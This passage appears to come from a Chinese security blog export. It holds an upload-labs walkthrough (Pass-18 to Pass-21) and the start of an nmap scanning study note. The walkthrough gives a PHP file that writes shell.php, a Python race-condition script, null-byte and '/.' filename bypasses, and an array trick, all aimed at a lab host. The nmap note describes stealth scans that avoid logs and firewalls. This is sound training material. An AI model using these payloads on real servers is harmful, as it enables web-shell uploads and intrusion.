class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;            unlink(<span class="hljs-variable">$upload_file</span>);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>这里先是上传文件临时保存,接着进行文件类型判断,如果白名单不存在就删除文件,如果白名单存在就重命名文件保存,所以这里存在条件竞争</p><h3 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h3><p>新建一个php_payload.php文件</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>新建一个python_payload.py</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    i=<span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        <span class="hljs-keyword">try</span>:            a=requests.get(<span class="hljs-string">&quot;http://192.168.78.101/upload/upload/php_payload.php&quot;</span>)            <span class="hljs-keyword">if</span> a.status_code==<span class="hljs-number">200</span>:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)                <span class="hljs-keyword">break</span>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">pass</span>        <span class="hljs-built_in">print</span>(i)        i+=<span class="hljs-number">1</span><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre></div><p>抓包Ctrl+i,送入测试器,调整参数:位置-&gt;$清楚,有效负债-&gt;没有负债,无限期地重复,选项-&gt;线程数20</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-18Burp%E6%B5%8B%E8%AF%95%E5%99%A8.gif"></p><p>执行python脚本,直至输入OK(尽量多试几次,有时候返回ok,结果没有生成文件)</p><p>访问<code>http://192.168.78.101/upload/upload/shell.php</code>,如果访问错误,请多次尝试复现漏洞</p><br><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><blockquote><p>需要代码审计！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);    <span class="hljs-variable">$imgFileName</span> =time();    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> MyUpload(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;upload(UPLOAD_PATH);    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;            <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">default</span>:            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;            <span class="hljs-keyword">break</span>;    &#125;&#125;<span class="hljs-comment">//myupload.php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;..................  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );..................    <span class="hljs-comment">/** upload()</span><span class="hljs-comment">   **</span><span class="hljs-comment">   ** Method to upload the file.</span><span class="hljs-comment">   ** This is the only method to call outside the class.</span><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><span class="hljs-comment">  **/</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    &#125;    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;setDir( <span class="hljs-variable">$dir</span> );    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    &#125;    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkExtension();    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );    &#125;    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkSize();    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );        &#125;    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;      <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );          &#125;    &#125;    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;move();    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );        &#125;    <span class="hljs-comment">// check if we need to rename the file</span>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;      <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">$this</span>-&gt;renameFile();      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-variable">$ret</span> );          &#125;    &#125;    <span class="hljs-comment">// if we are here, everything worked as planned :)</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );  &#125;..................&#125;;</code></pre></div><blockquote><p>本题需要Apache+PHP的环境,Nginx+PHP无法复现</p></blockquote><h3 id="条件竞争漏洞-1"><a href="#条件竞争漏洞-1" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>本题依然是文件上传先临时保存,然后在修改文件名,只要文件上传够快,php重命名就会来不及,所以存在条件竞争,且需要结合Apache未知后缀解析漏洞</p><h3 id="复现漏洞-1"><a href="#复现漏洞-1" class="headerlink" title="复现漏洞"></a>复现漏洞</h3><p>依旧使用Pass-18的payload.php的代码,并重命名为php_payload.php.7z</p><p>Python脚本也是用Pass-18的,且请求的Url里的文件名改为php_payload.php.7z</p><p>不知道是不是环境问题,我测试的时候文件上传的Url为:</p><p><code>http://192.168.78.101/upload/uploadphp_payload.php.7z</code>upload和php_payload.php.7z之间少了条反斜杠,所以python的请求的Url为:</p><p><code>http://192.168.78.101/upload/upload/php_payload.php.7z</code></p><p><code>大家根据自己环境进行修改</code></p><br><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><blockquote><p>本pass的取文件名通过$_POST来获取。</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];        <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="00截断与-绕过"><a href="#00截断与-绕过" class="headerlink" title="00截断与/.绕过"></a>00截断与/.绕过</h3><p>由于文件上传后,通过POST将文件名传递,所以可以在move_uploaded_file来绕过黑名单</p><div class="code-wrapper"><pre><code class="hljs powershell">payload1:upload<span class="hljs-literal">-19</span>.jpg -&gt; upload<span class="hljs-literal">-19</span>.php%<span class="hljs-number">00</span>由于是POST所以需要像Pass<span class="hljs-literal">-13</span>一样需要手动进行urldecodepayload2:upload<span class="hljs-literal">-19</span>.jpg -&gt; upload<span class="hljs-literal">-19</span>/.</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%851.png"></p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-20burp%E6%8A%93%E5%8C%852.png"></p><br><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><blockquote><p>Pass-20来源于CTF，请审计代码！(😅都更新21题了,提示还不改😅)</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;    <span class="hljs-comment">//检查MIME</span>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-comment">//检查文件名</span>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));        &#125;        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;&#125;</code></pre></div><h3 id="数组-绕过"><a href="#数组-绕过" class="headerlink" title="数组/绕过"></a>数组/绕过</h3><p><code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤,而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>upload-29.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>upload-29.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>upload-29.php</code>。</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-21burp%E6%8A%93%E5%8C%85.png"></p><br><h2 id="文件上传漏洞分析流程"><a href="#文件上传漏洞分析流程" class="headerlink" title="文件上传漏洞分析流程"></a>文件上传漏洞分析流程</h2><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web漏洞 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 学习手册</title>
      <link href="/Study/post/Study-Note-Nmap/"/>
      <url>/Study/post/Study-Note-Nmap/</url>
      
        <content type="html"><![CDATA[<p>nmap学习手册</p><h1 id="nmap-描述"><a href="#nmap-描述" class="headerlink" title="nmap 描述"></a>nmap 描述</h1><p>​        Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。 —— 来自<a href="https://nmap.org/man/zh/index.html">nmap官网</a></p><br><br><h1 id="nmap语法"><a href="#nmap语法" class="headerlink" title="nmap语法"></a>nmap语法</h1><div class="code-wrapper"><pre><code class="hljs shell">nmap [扫描类型&amp;选项] (目标)</code></pre></div><br><br><h1 id="nmap目标"><a href="#nmap目标" class="headerlink" title="nmap目标"></a>nmap目标</h1><p>nmap的目标可以传递<strong>主机名 , IP地址 , 网段</strong>等</p><br><br><h1 id="nmap扫描类型-amp-选项"><a href="#nmap扫描类型-amp-选项" class="headerlink" title="nmap扫描类型&amp;选项"></a>nmap扫描类型&amp;选项</h1><h2 id="快速扫描"><a href="#快速扫描" class="headerlink" title="快速扫描"></a>快速扫描</h2><p>nmap 192.168.50.148</p><p>nmap会发送一个ping包 , 来检测目标主机上以开放的端口(范围暂不清楚) , 不推荐此方法检测,因为结果比较模糊</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-scan.jpg" alt="nmap 扫描"></p><br><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="sL-列表发现"><a href="#sL-列表发现" class="headerlink" title="-sL : 列表发现"></a>-sL : 列表发现</h3><p>​    仅对发现主机列出来,不进行任何扫描</p><p>  <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sL.jpg" alt="nmap -sL扫描"></p><h3 id="sP-Ping扫描"><a href="#sP-Ping扫描" class="headerlink" title="-sP : Ping扫描"></a>-sP : Ping扫描</h3><p>​    只确定是否在线,不进行更深一步扫描</p><p>  <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sP.jpg" alt="nmap -sP扫描"></p><br><h2 id="扫描技巧"><a href="#扫描技巧" class="headerlink" title="扫描技巧"></a>扫描技巧</h2><h3 id="sS-半开放扫描"><a href="#sS-半开放扫描" class="headerlink" title="-sS : 半开放扫描"></a>-sS : 半开放扫描</h3><p>​    使用频率比较高的扫描类型 , <a href="https://baike.baidu.com/item/SYN/8880122?fr=aladdin">SYN</a>扫描 , 又称为半开放扫描 , 它不需要建立一个完整<a href="https://baike.baidu.com/item/TCP/33012?fr=aladdin">TCP</a>连接(建立一次TCP需要进行三次握手 , 而第一次握手则是发送SYN报文),因此 TCP SYN Scan(sS) 被称为半开放扫描</p><ul><li><p>优点 : nmap 发送 SYN包到目标是不会产生任何会话 , 目标主机几乎不会把连接记入系统日志(并非一定 ! ! ! , 能有效阻止目标判断为扫描攻击) , 扫描速度快 , 效率高 , 在工作中使用频率较高</p></li><li><p>缺点 : 执行命令需要系统最高权限,即 root 或者 Administrator 权限</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sS.jpg" alt="nmap -sS扫描"></p></li></ul><h3 id="sT-TCP扫描"><a href="#sT-TCP扫描" class="headerlink" title="-sT : TCP扫描"></a>-sT : TCP扫描</h3><p>​    TCP connect() Scan (sT) , 相对于TCP SYN Scan , TCP connect() Scan 是默认的扫描模式,使用TCP connect()扫描需要调用系统的connect()</p><ul><li><p>优点 : 执行命令无需系统最高权限 , 普通用户亦可执行命令</p></li><li><p>缺点 : 由于扫描会产生会话 , 所以目标主机会记录大量的连接请求记入系统日志 , 并且若有防护程序则会识别出扫描攻击 , 因为要进行三次握手 , 所以速度较慢 , 效率较低</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sT.jpg" alt="nmap -sT扫描"></p></li></ul><h3 id="sU-UDP扫描"><a href="#sU-UDP扫描" class="headerlink" title="-sU : UDP扫描"></a>-sU : UDP扫描</h3><p>​    <a href="https://baike.baidu.com/item/UDP/571511">UDP</a> Scan(sU) 相对于 SYN扫描和TCP扫描 , UDP扫描无需进行三次握手和发送SYN包 , 因为 UDP Scan是针对UDP端口扫描的,只需发送UDP数据包到目标 , 然后等待响应即可</p><p>​    如果返回是ICMP的错误信息 , 这说明端口是关闭的 , 若返回是正确的回应 , 则说明端口是开放的 , UDP扫描速度会很慢 , 比TCP扫描慢😓</p><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sU.jpg" alt="nmap -sU扫描"></p><h3 id="sF-FIN扫描"><a href="#sF-FIN扫描" class="headerlink" title="-sF : FIN扫描"></a>-sF : FIN扫描</h3><p>​    FIN扫描也是TCP的一种扫描 , 发送一个FIN标志的数据包 , 有时候目标主机可能存在IDS和IPS系统,会阻止掉SYN数据包 , 因此FIN标志的数据包一般不会阻止 , 而且FIN标志的数据包也是无需进行TCP的三次握手 , 因此FIN扫描也是大概率不会被目标把连接记入系统日志 , 扫描的信息相对较少</p><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sF.jpg" alt="nmap -sF扫描"></p><h3 id="sF-sX-sN-原理类似"><a href="#sF-sX-sN-原理类似" class="headerlink" title="-sF -sX -sN : 原理类似"></a>-sF -sX -sN : 原理类似</h3><p>​    原理大致相同 -sF 是 发送FIN数据包扫描 -sX 是 圣诞树(XmasTree)扫描 -sN是 空(NULL)扫描</p><p>​    有的防火墙可能会阻止 -sS扫描 , 使用这些扫描类型可以绕过阻止进行扫描 , 他们也是没有进行TCP三次握手 , 目标主机大概率不会被目标把连接记入系统日志,且扫描速度比 -sT 块</p><ul><li>优点 : 能躲过一些无状态防火墙和报文过滤路由器，比SYN还要隐秘</li><li>缺点 : 现代的IDS产品可以发现，并非所有的系统严格遵循<a href="https://harttle.land/2014/09/27/tcp.html">RFC 793</a></li></ul><br><h2 id="服务版本识别"><a href="#服务版本识别" class="headerlink" title="服务版本识别"></a>服务版本识别</h2><h3 id="sV-Version版本扫描检测"><a href="#sV-Version版本扫描检测" class="headerlink" title="-sV : Version版本扫描检测"></a>-sV : Version版本扫描检测</h3><p>​    Version 版本检测是用来扫描目标主机上的端口服务版本 , 不过此扫描选项不能用来扫描目标开放端口 , 因此使用此选项之前 , 请使用TCPSYN进行端口开放扫描</p><ul><li><p>–version-intensity “Level” : 设置版本扫描强度 , Level范围为0~9 默认为7</p></li><li><p>–version-light : 轻量级扫描 , 即 –version-intensity 2</p></li><li><p>–version-all : 重度扫描 : 即 –version-intensity 9</p></li><li><p>version-trace : 显示详细的扫描过程 ()</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sV.jpg" alt="nmap -sV扫描"></p></li></ul><br><h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><h3 id="O-OS操作系统扫描检测"><a href="#O-OS操作系统扫描检测" class="headerlink" title="-O : OS操作系统扫描检测"></a>-O : OS操作系统扫描检测</h3><p>OS操作系统扫描检测 , 可以远程轿车操作系统信息 , 这些信息是十分有用的 , 通过获取的信息可以知道已知的漏洞</p><ul><li>–osscan-guess : 猜测匹配操作系统</li><li>–osscan-limit : 针对指定的目标进行系统检测</li></ul><p><img 